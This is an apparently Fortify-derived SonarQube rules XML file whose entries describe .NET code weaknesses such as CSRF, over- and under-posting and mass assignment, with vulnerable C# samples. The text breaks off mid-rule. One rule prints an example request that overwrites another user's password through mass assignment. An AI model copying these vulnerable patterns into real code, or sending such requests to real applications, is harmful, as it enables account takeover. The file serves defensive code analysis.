<rules>
  <!-- see names and descriptions in org/sonar/l10n/ -->
  <rule>
    <key>api_abuse_asp_net_mvc_bad_practices_controller_action_not_restricted_to_post</key>
    <internalKey>API Abuse/ASP.NET MVC Bad Practices/Controller Action Not Restricted to POST</internalKey>
    <name>ASP.NET MVC Bad Practices: Controller Action Not Restricted to POST</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The controller action may benefit from being restricted to accept only the POST verb.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  ASP.NET MVC controller actions that modify data by writing, updating, or deleting could benefit from being restricted to accept the POST verb.  This increases the difficulty of cross-site request forgery because accidental clicking of links will not cause the action to execute.<br><br>The following controller action by default accepts any verb and may be susceptible to cross-site request forgery:<br><br><pre><br>public ActionResult UpdateWidget(Model model)<br>{<br>  // ... controller logic<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A5 Cross Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A5 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A8 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3585 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3585 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3585 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3585 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3585 CAT II</em> <br></p>
																									   <p>[9]  <em>ASP.NET MVC Best Practices (Part 1)</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-Site Request Forgery</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 352</em> <br></p>
																									   <p>[12]  <em>Don't use Delete Links because they create Security Holes</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>api_abuse_asp_net_mvc_bad_practices_model_with_optional_and_required_properties</key>
    <internalKey>API Abuse/ASP.NET MVC Bad Practices/Model With Optional and Required Properties</internalKey>
    <name>ASP.NET MVC Bad Practices: Model With Optional and Required Properties</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The model class has properties that are required and properties that are not required and therefore may be susceptible to over-posting attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Using a model class that has properties that are required (as marked with the <code>[Required]</code> attribute) and properties that are optional (as not marked with the <code>[Required]</code> attribute) can lead to problems if an attacker communicates a request that contains more data than is expected.<br><br>The ASP.NET MVC framework will try to bind request parameters to model properties.<br><br>Having mixed requiredness without explicitly communicating which parameters are to be model-bound may indicate that there are model properties for internal use but can be controlled by attacker.<br><br>The following code defines a possible model class that has properties that have <code>[Required]</code> and properties that do not have <code>[Required]</code>:<br><br><pre><br>public class MyModel<br>{<br>    [Required]<br>    public String UserName { get; set; }<br><br>    [Required]<br>    public String Password { get; set; }<br><br>    public Boolean IsAdmin { get; set; }<br>}<br></pre><br><br>If any optional parameters can change the behavior of an application, then an attacker may be able to actually change that behavior by communicating an optional parameter in a request.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5]  <em>BindAttribute Class</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[7]  <em>Input Validation vs. Model Validation in ASP.NET MVC</em> <br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[9]  <em>RequiredAttribute Class</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>api_abuse_asp_net_mvc_bad_practices_model_with_required_non_nullable_property</key>
    <internalKey>API Abuse/ASP.NET MVC Bad Practices/Model With Required Non-Nullable Property</internalKey>
    <name>ASP.NET MVC Bad Practices: Model With Required Non-Nullable Property</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The model class has a required non-nullable property and therefore may be susceptible to under-posting attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Using a model class that has non-nullable properties that are required (as marked with the <code>[Required]</code> attribute) can lead to problems if an attacker communicates a request that contains less data than is expected.<br><br>The ASP.NET MVC framework will try to bind request parameters to model properties.<br><br>If a model has a required non-nullable parameter and an attacker does not communicate that required parameter in a request -- that is, the attacker uses an under-posting attack -- then the property will have the default value (usually zero) which will satisfy the <code>[Required]</code> validation attribute.  This may produce unexpected application behavior.<br><br>The following code defines a possible model class that has a required enum, which is non-nullable:<br><br><pre><br>public enum ArgumentOptions<br>{<br>    OptionA = 1,<br>    OptionB = 2<br>}<br><br>public class Model<br>{<br>    [Required]<br>    public String Argument { get; set; }<br><br>    [Required]<br>    public ArgumentOptions Rounding { get; set; }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[6]  <em>Input Validation vs. Model Validation in ASP.NET MVC</em> <br></p>
																									   <p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>api_abuse_asp_net_mvc_bad_practices_optional_submodel_with_required_property</key>
    <internalKey>API Abuse/ASP.NET MVC Bad Practices/Optional Submodel With Required Property</internalKey>
    <name>ASP.NET MVC Bad Practices: Optional Submodel With Required Property</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The model class has a required property and is the type of an optional member of a parent model type and therefore may be susceptible to under-posting attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If a model class has required property and is the type of an optional member of a parent model class, it may be susceptible to under-posting attacks if an attacker communicates a request that contains less data than is expected.<br><br>The ASP.NET MVC framework will try to bind request parameters to model properties, including submodels.<br><br>If a submodel is optional -- that is, the parent model has a property without the <code>[Required]</code> attribute -- and if an attacker does not communicate that submodel, then the parent property will have a <code>null</code> value and the required fields of the child model will not be asserted by model validation.  This is one form of an under-posting attack.<br><br>Consider the following the model class definitions:<br><br><pre><br>public class ChildModel<br>{<br>    public ChildModel()<br>    {<br>    }<br><br>    [Required]<br>    public String RequiredProperty { get; set; }<br>}<br><br>public class ParentModel<br>{<br>    public ParentModel()<br>    {<br>    }<br><br>    public ChildModel Child { get; set; }<br>}<br></pre><br><br>If an attacker does not communicate a value for the <code>ParentModel.Child</code> property, then the <code>ChildModel.RequiredProperty</code> property will have a <code>[Required]</code> which is not asserted.  This may produce unexpected and undesirable results.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[6]  <em>Input Validation vs. Model Validation in ASP.NET MVC</em> <br></p>
																									   <p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>api_abuse_code_correctness_call_to_gc_collect_</key>
    <internalKey>API Abuse/Code Correctness/Call to GC.Collect()</internalKey>
    <name>Code Correctness: Call to GC.Collect()</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Explicit requests for garbage collection are a bellwether indicating likely performance problems.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  At some point in every .NET developer's career, a problem surfaces that appears to be so mysterious, impenetrable, and impervious to debugging that there seems to be no alternative but to blame the garbage collector. Especially when the bug is related to time and state, there may be a hint of empirical evidence to support this theory: inserting a call to <code>GC.Collect()</code> sometimes seems to make the problem go away.<br><br>In almost every case we have seen, calling <code>GC.Collect()</code> is the wrong thing to do. In fact, calling <code>GC.Collect()</code> can cause performance problems if it is invoked too often.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 730</em> <br></p>
																									   <p>[8] Rico Mariani <em>Performance Tidbits</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>
																									   <p>[11] Scott Holden <em>The perils of GC.Collect()</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>api_abuse_code_correctness_class_does_not_implement_equals</key>
    <internalKey>API Abuse/Code Correctness/Class Does Not Implement Equals</internalKey>
    <name>Code Correctness: Class Does Not Implement Equals</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  <code>Equals()</code> is called on an object that does not implement <code>Equals()</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When comparing objects, developers usually want to compare properties of objects. However, calling <code>Equals()</code> on a class (or any super class/interface) that does not explicitly implement <code>Equals()</code> results in a call to the <code>Equals()</code> method inherited from <code>System.Object</code>. Instead of comparing object member fields or other properties, <code>Object.Equals()</code> compares two object instances to see if they are the same. Although there are legitimate uses of <code>Object.Equals()</code>, it is often an indication of buggy code.<br><br><b>Example 1:</b><br><pre><br>public class AccountGroup<br>{<br>    private int gid;<br><br>    public int Gid<br>    {<br>        get { return gid; }<br>        set { gid = value; }<br>    }<br>}<br>...<br>public class CompareGroup<br>{<br>    public bool compareGroups(AccountGroup group1, AccountGroup group2)<br>    {<br>        return group1.Equals(group2);   //Equals() is not implemented in AccountGroup<br>    }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>api_abuse_code_correctness_tostring_on_array</key>
    <internalKey>API Abuse/Code Correctness/ToString on Array</internalKey>
    <name>Code Correctness: ToString on Array</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  <code>ToString()</code> is called on an array.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  In most cases, a call to <code>ToString()</code> on an array indicates a developer is interested in returning the contents of the array as a String. However, a direct call to <code>ToString()</code> on an array will return a string value containing the array's type.<br><br><b>Example 1:</b> The following code will output <code>System.String[]</code>.<br><pre><br>String[] stringArray = { "element 1", "element 2", "element 3", "element 4" };<br>System.Diagnostics.Debug.WriteLine(stringArray.ToString());<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>Class Arrays</em> Microsoft<br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>api_abuse_mass_assignment_insecure_binder_configuration</key>
    <internalKey>API Abuse/Mass Assignment/Insecure Binder Configuration</internalKey>
    <name>Mass Assignment: Insecure Binder Configuration</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The framework binder used for binding the HTTP request parameters to the model class has not been explicitly configured to allow, or disallow, certain attributes.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  To ease development and increase productivity, most modern frameworks allow an object to be automatically instantiated and populated with the HTTP request parameters whose names match an attribute of the class to be bound. Automatic instantiation and population of objects speeds up development, but can lead to serious problems if implemented without caution. Any attribute in the bound classes, or nested classes, will be automatically bound to the HTTP request parameters. Therefore malicious users will be able to assign a value to any attribute in bound or nested classes, even if they are not exposed to the client through web forms or API contracts.<br><br><b>Example 1: </b>With no additional configuration, the following ASP.NET MVC controller method will bind the HTTP request parameters to any attribute in the <code>RegisterModel</code> or <code>Details</code> classes:<br><br><pre><br>public ActionResult Register(RegisterModel model)<br>{<br>    if (ModelState.IsValid)<br>    {<br>        try<br>        {<br>            return RedirectToAction("Index", "Home");<br>        }<br>        catch (MembershipCreateUserException e)<br>        {<br>            ModelState.AddModelError("", "");<br>        }<br>    }<br>    return View(model);<br>}<br></pre><br><br>Where <code>RegisterModel</code> class is defined as:<br><br><pre><br>public class RegisterModel<br>{<br>    [Required]<br>    [Display(Name = "User name")]<br>    public string UserName { get; set; }<br><br>    [Required]<br>    [DataType(DataType.Password)]<br>    [Display(Name = "Password")]<br>    public string Password { get; set; }<br><br>    [DataType(DataType.Password)]<br>    [Display(Name = "Confirm password")]<br>    public string ConfirmPassword { get; set; }<br><br>    public Details Details { get; set; }<br><br>    public RegisterModel()<br>    {<br>        Details = new Details();<br>    }<br>}<br></pre><br><br>and <code>Details</code> class is defined as:<br><br><pre><br>public class Details<br>{<br>    public Details()<br>    {<br>        IsAdmin = false;<br>    }<br>    public bool IsAdmin { get; set; }<br>    ...<br>}<br></pre><br><br><b>Example 2: </b>When using <code>TryUpdateModel()</code> or <code>UpdateModel()</code> in ASP.NET MVC, Web Forms or Web API applications, the model binder will automatically try to bind all HTTP request parameters by default:<br><br><pre><br>public ViewResult Register()<br>{<br>    var model = new RegisterModel();<br>    TryUpdateModel&lt;RegisterModel&gt;(model);<br>    return View("detail", model);<br>}<br></pre><br><br><b>Example 3: </b>In ASP.NET Web API applications, the model binder will automatically try to bind all HTTP request parameters by default using the configured JSON or XML serializer/deserializer. By default, the binder will try to bind all possible attributes from the HTTP request parameters or body:<br><br><pre><br>public class ProductsController : ApiController<br>{<br>  public string SaveProduct([FromBody] Product p)<br>  {<br>      return p.Name;<br>  }<br>  ...<br>}<br></pre><br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 915</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] OWASP <em>Mass assignment</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>api_abuse_mass_assignment_request_parameters_bound_into_persisted_objects</key>
    <internalKey>API Abuse/Mass Assignment/Request Parameters Bound into Persisted Objects</internalKey>
    <name>Mass Assignment: Request Parameters Bound into Persisted Objects</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							   Allowing database persistent entities to be auto-populated by request parameters can allow an attacker to create unintended records in association entities or update unintended fields in the entity object.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Model objects are an object-oriented representation of database entities.<br>		They provide convenience methods to load, store, update, and delete associated database entities.<br>		Hibernate, the Microsoft .NET Entity framework, and LINQ are examples of Object Relational Mapping (ORM) frameworks<br>		that help you build database-backed model objects.<br><br>		Many web frameworks strive to make life easier for developers by providing a mechanism for binding request parameters<br>		 into request-bound objects based on matching request parameter names to model object attribute names<br>		 (based on matching public getter and setter methods).<br><br>		If an application uses ORM classes as request-bound objects, then it is likely that a request parameter<br>		can modify any field in corresponding model objects and any nested field of an object attribute.<br><br><b>Example 1:</b> The <code>Order</code>, <code>Customer</code>, and <code>Profile</code> are Microsoft .NET Entity persisted classes.<br><pre><br>public class Order {<br>	public string ordered { get; set; }<br>	public List&lt;LineItem&gt; LineItems { get; set; }<br>	pubilc virtual Customer Customer { get; set; }<br>...<br>}<br>public class Customer {<br>	public int CustomerId { get; set; }<br>	...<br>	public virtual Profile Profile { get; set; }<br>...<br>}<br>public class Profile {<br>	public int profileId { get; set; }<br>	public string username { get; set; }<br>	public string password { get; set; }<br>	...<br>}<br></pre><br><code>OrderController</code> is the ASP.NET MVC controller class handling the request:<br><pre><br><br>public class OrderController : Controller{<br>	StoreEntities db = new StoreEntities();<br>...<br><br>	public String updateOrder(Order order) {<br>		...<br>		db.Orders.Add(order);<br>		db.SaveChanges();<br>	}<br>}<br></pre><br>Because model entity classes are automatically bound to requests, an attacker can use this vulnerability to update another user's password by adding the following request parameters to the request: &quot;http://www.yourcorp.com/webApp/updateOrder?order.customer.profile.profileId=1234&amp;order.customer.profile.password=urpowned&quot;
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 915</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] Josh Bush <em>Mass Assignment Vulnerability in ASP.NET MVC</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>api_abuse_missing_check_against_null</key>
    <internalKey>API Abuse/Missing Check against Null</internalKey>
    <name>Missing Check against Null</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program might dereference a null pointer because it does not check the return value of a function that might return null.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.<br><br>Two dubious assumptions that are easy to spot in code are "this function call can never fail" and "it doesn't matter if this function call fails". When a programmer ignores the return value from a function, they implicitly state that they are operating under one of these assumptions.<br><br><b>Example 1:</b>  The following code does not check to see if the string returned by the <code>Item</code> property is null before calling the member function <code>Equals()</code>, potentially causing a null dereference.<br><br><pre><br>string itemName = request.Item(ITEM_NAME);<br>	if (itemName.Equals(IMPORTANT_ITEM)) {<br>		...<br>	}<br>	...<br></pre><br><br>The traditional defense of this coding error is:<br><br>"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value."<br><br>But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II, APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II, APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II, APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II, APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II, APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 253, CWE ID 690</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>api_abuse_object_model_violation_just_one_of_equals___and_gethashcode___defined_just_one_of_equals_hashcode_defined</key>
    <internalKey>API Abuse/Object Model Violation/Just One of Equals() and GetHashCode() Defined(just_one_of_equals_hashcode_defined)</internalKey>
    <name>Object Model Violation: Just One of Equals() and GetHashCode() Defined(just_one_of_equals_hashcode_defined)</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This class overrides only one of <code>Equals()</code> and <code>GetHashCode()</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  .NET objects are expected to obey a number of invariants related to equality. One of these invariants is that equal objects must have equal hashcodes. In other words, if <code>a.Equals(b) == true</code> then <code>a.GetHashCode() == b.GetHashCode()</code>.<br><br>Failure to uphold this invariant is likely to cause trouble if objects of this class are stored in a collection. If the objects of the class in question are used as a key in a Hashtable or if they are inserted into a Dictionary, it is critical that equal objects have equal hashcodes.<br><br><b>Example 1:</b> The following class overrides <code>Equals()</code> but not <code>GetHashCode()</code>.<br><br><pre><br>public class Halfway() {<br>  public override boolean Equals(object obj) {<br>    ...<br>  }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 581</em> <br></p>
																									   <p>[2]  <em>MSDN Library: Equals Method (Object)</em> Microsoft Corporation<br></p>
																									   <p>[3]  <em>MSDN Library: GetHashCode Method (Object)</em> Microsoft Corporation<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>api_abuse_often_misused_authentication</key>
    <internalKey>API Abuse/Often Misused/Authentication</internalKey>
    <name>Often Misused: Authentication</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Attackers can spoof DNS entries. Do not rely on DNS names for security.
							</p>
							<h2>EXPLANATION</h2>
							<p>
